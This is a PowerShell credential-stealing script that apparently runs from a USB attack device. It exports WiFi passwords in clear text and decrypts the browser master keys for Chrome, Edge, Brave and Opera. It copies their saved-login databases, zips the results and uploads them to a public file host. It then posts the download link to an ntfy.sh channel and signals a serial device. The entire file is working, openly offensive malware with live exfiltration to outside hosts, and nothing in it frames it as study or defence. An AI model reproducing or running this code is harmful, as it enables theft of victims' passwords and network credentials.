$topic = "data_stwealer_hideen_"
Write-Host "=== [ ULTRA LOOTER v2.4: DEP-LOADER ] ===" -ForegroundColor Cyan

# 1. FORCE LOAD SECURITY DLL (This fixes the 'Unable to find type' error)
try {
    Add-Type -AssemblyName System.Security
    Write-Host "[+] Security Libraries Loaded." -ForegroundColor Green
} catch {
    Write-Host "[-] Failed to load Security DLL." -ForegroundColor Red
}

# 2. Workspace Setup
$dir = "$env:TEMP\LootBox"; $zip = "$env:TEMP\package.zip"
if (Test-Path $dir) { Remove-Item -Recurse -Force $dir }; mkdir $dir | Out-Null

# 3. WiFi Export
netsh wlan export profile folder=$dir key=clear | Out-Null

# 4. Chromium Decryption
# We use $env:LOCALAPPDATA and $env:APPDATA to ensure it finds the CURRENT user
$chromes = @{
    "Chrome"  = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    "Edge"    = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
    "Brave"   = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State"
    "Opera"   = "$env:APPDATA\Opera Software\Opera Stable\Local State"
}

foreach ($browser in $chromes.Keys) {
    $path = $chromes[$browser]
    if (Test-Path $path) {
        try {
            $json = Get-Content $path -Raw | ConvertFrom-Json
            $encKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
            
            # This is the line that was failing:
            $unlockedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey[5..($encKey.Length-1)], $null, 'CurrentUser')
            
            [System.BitConverter]::ToString($unlockedKey) -replace '-' | Out-File "$dir\${browser}_MasterKey.txt"
            
            # Database Path Logic
            $dbPath = $path.Replace("Local State", "Default\Login Data")
            if ($browser -like "Opera*") { $dbPath = $path.Replace("Local State", "Login Data") }
            
            if (Test-Path $dbPath) {
                # Attempt to copy even if locked
                Copy-Item $dbPath -Destination "$dir\${browser}_LoginData.db" -Force -ErrorAction SilentlyContinue
                Write-Host "    [+] ${browser}: Success" -ForegroundColor Green
            }
        } catch { 
            Write-Host "    [-] ${browser} Error: $($_.Exception.Message)" -ForegroundColor Red
        }
    } else {
        Write-Host "    [?] ${browser}: Not installed or path wrong." -ForegroundColor Gray
    }
}

# 5. Zipping and Uploading
Add-Type -AssemblyName "System.IO.Compression.FileSystem"
[System.IO.Compression.ZipFile]::CreateFromDirectory($dir, $zip)
$link = curl.exe -s -F "reqtype=fileupload" -F "fileToUpload=@$zip" https://catbox.moe/user/api.php

if ($link -like "http*") {
    Invoke-RestMethod -Uri "https://ntfy.sh/$topic" -Method Post -Body "Loot Found: $link"
    Write-Host "[!] SUCCESS: $link" -ForegroundColor Green
    
    # --- THE SIGNAL ---
    $portName = (Get-PnpDevice -FriendlyName "USB Serial Device*" -Status OK).Caption | Select-String -Pattern "COM(\d+)" | ForEach-Object { $_.Matches.Value }
    if ($portName) {
        # Final Attempt at Serial Signal
        cmd.exe /c "echo F > $portName" 2>$null
    }
}

Write-Host "`n=== DEBUG FINISHED ===" -ForegroundColor Cyan
Read-Host "Press Enter to Clean and Exit..."
Remove-Item -Recurse -Force $dir, $zip
